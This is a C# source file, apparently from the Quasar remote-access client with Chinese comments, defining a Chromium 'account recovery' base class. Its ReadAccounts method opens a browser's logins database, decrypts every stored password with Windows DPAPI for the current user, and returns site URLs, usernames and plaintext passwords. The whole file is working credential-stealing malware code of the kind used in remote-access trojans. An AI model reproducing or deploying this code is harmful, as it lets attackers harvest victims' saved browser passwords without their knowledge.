using System;
using Quasar.Common.Models;
using System.Collections.Generic;
using Quasar.Client.Recovery.Utilities;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace Quasar.Client.Recovery.Browsers
{
    /// <summary>
    /// 提供基于chrome内核的应用程序的基本账户恢复能力。
    /// </summary>
    public abstract class ChromiumBase : IAccountReader
    {
        /// <inheritdoc />
        public abstract string ApplicationName { get; }

        /// <inheritdoc />
        public abstract IEnumerable<RecoveredAccount> ReadAccounts();

        /// <summary>
        /// 读取基于chromium的应用程序的存储账户。
        /// </summary>
        /// <param name="filePath">登录数据库的文件路径。</param>
        /// <param name="browserName">基于chromium的应用程序的名称。</param>
        /// <returns>已恢复的账户列表。</returns>
        protected List<RecoveredAccount> ReadAccounts(string filePath, string browserName)
        {
            var result = new List<RecoveredAccount>();

            if (File.Exists(filePath))
            {
                SQLiteHandler sqlDatabase;

                if (!File.Exists(filePath))
                    return result;

                try
                {
                    sqlDatabase = new SQLiteHandler(filePath);
                }
                catch (Exception)
                {
                    return result;
                }

                if (!sqlDatabase.ReadTable("logins"))
                    return result;

                for (int i = 0; i < sqlDatabase.GetRowCount(); i++)
                {
                    try
                    {
                        var host = sqlDatabase.GetValue(i, "origin_url");
                        var user = sqlDatabase.GetValue(i, "username_value");
                        var pass = Encoding.UTF8.GetString(ProtectedData.Unprotect(
                            Encoding.Default.GetBytes(sqlDatabase.GetValue(i, "password_value")), null,
                            DataProtectionScope.CurrentUser));

                        if (!string.IsNullOrEmpty(host) && !string.IsNullOrEmpty(user))
                        {
                            result.Add(new RecoveredAccount
                            {
                                Url = host,
                                Username = user,
                                Password = pass,
                                Application = browserName
                            });
                        }
                    }
                    catch (Exception)
                    {
                        // ignore invalid entry
                    }
                }
            }
            else
            {
                throw new FileNotFoundException("Can not find chrome logins file");
            }

            return result;
        }
    }
}
